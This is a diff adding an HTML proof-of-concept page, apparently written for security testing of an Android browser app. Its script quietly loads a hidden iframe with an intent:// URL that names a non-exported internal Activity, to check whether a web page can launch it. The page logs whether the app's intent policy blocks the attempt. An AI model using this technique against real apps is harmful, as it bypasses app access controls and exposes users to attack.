@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>probe-intent-only</title>
+</head>
+<body style="font-family:monospace;font-size:22px;padding:16px">
+<p>GameWebViewClient intent probe (no download / no WebContainer)</p>
+<pre id="o"></pre>
+<script>
+// 仅验证：进入 Games WebView 后，intent:// + 显式 component 能否拉起本包非导出 Activity
+var TARGET =
+  "intent://probe/#Intent;component=com.talpa.hibrowser/com.toolmatrix.feedback.WebContainerActivity;S.url=https%3A%2F%2Fexample.com;S.client_key=hola_vpn;end";
+
+function log(m) {
+  document.getElementById("o").textContent += m + "\n";
+}
+
+log("origin=" + location.href);
+log("ua=" + navigator.userAgent);
+log("target=" + TARGET);
+log("expect: WebContainer opens => intent path still allows internal component");
+log("expect: stay on this page => WebExternalIntentPolicy blocked it");
+
+setTimeout(function () {
+  var f = document.createElement("iframe");
+  f.style.display = "none";
+  f.src = TARGET;
+  document.body.appendChild(f);
+  log("iframe_appended t=" + Date.now());
+}, 1500);
+</script>
+</body>
+</html>
